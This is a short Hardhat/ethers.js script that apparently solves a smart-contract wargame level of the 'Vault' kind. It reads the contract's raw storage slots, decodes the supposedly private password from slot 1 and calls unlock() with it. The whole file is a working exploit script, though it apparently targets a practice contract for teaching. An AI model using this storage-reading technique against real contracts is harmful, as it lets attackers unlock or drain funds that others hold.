import { network } from "hardhat";



const { ethers } = await network.create();

const CONTRACT_VAULT_ADDRESS = "0x91969717B42d8E19317f8605B9520177FF20cb8B";

const ABI_CONTRACT_VAULT = [
  "function unlock(bytes32 _password) public",
  "function locked() view returns (bool)",
];

const contract = await ethers.getContractAt(ABI_CONTRACT_VAULT, CONTRACT_VAULT_ADDRESS);

const slot0 = await ethers.provider.getStorage(CONTRACT_VAULT_ADDRESS, 0);
const slot1 = await ethers.provider.getStorage(CONTRACT_VAULT_ADDRESS, 1);

console.log(`Storage at slot 0: ${slot0}`);
console.log(`Storage at slot 1: ${slot1}`);
console.log(`Locked status: ${await contract.locked()}`);

// Decode the value at slot 1 to get the password
const bytes = ethers.getBytes(slot1);
console.log(`Bytes at slot 1: ${bytes}`);
const decoded = ethers.toUtf8String(bytes);
console.log(`Decoded password: ${decoded}`);


const result = await contract.unlock(bytes);
console.log(`Unlock result: ${result}`);
console.log(`Locked status after unlock: ${await contract.locked()}`);
